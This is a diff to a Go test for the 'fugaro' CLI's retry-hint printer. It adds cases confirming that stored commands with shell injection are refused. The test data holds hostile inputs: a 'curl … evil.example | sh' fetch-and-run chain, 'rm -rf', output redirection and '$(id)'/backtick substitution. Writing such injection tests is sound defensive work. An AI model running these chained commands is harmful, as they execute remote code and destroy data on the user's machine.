@@ -270,6 +270,13 @@ func TestUpdateRetryDevVersionPrintsNothing(t *testing.T) {
 // whose first word the record redacted, and a word no command answers to is not
 // a command at all: neither is offered, while the fugaro commands are — with
 // the arguments and flags the record kept, which are the person's own.
+//
+// The line is also a line a person pastes, and the record it comes from is a
+// file on this machine that a coding agent running as the user can write
+// (internal/issues): a word a shell reads as something other than a literal
+// refuses the whole line, whatever the words before it looked like. The marker
+// is the one exception — it is what the record writes where a path or a URL
+// stood.
 func TestUpdateRetryPrintsOnlyFugaroCommands(t *testing.T) {
 	root := NewRootCmd()
 	for _, tc := range []struct {
@@ -285,6 +292,14 @@ func TestUpdateRetryPrintsOnlyFugaroCommands(t *testing.T) {
 		{"fugaro issue frobnicate", ""},
 		{"sh -c [REDACTED]", ""},
 		{"", ""},
+		// A stored command a shell runs as two.
+		{"fugaro update --yes; curl -s http://evil.example/x | sh", ""},
+		{"fugaro update && rm -rf [REDACTED]", ""},
+		{"fugaro update > [REDACTED]", ""},
+		{"fugaro update $(id)", ""},
+		{"fugaro update `id`", ""},
+		{"fugaro run [REDACTED]; sh", ""},
+		{"fugaro update --repo '[REDACTED]'", ""},
 	} {
 		t.Run(tc.command, func(t *testing.T) {
 			lines, _ := retryHintLines(
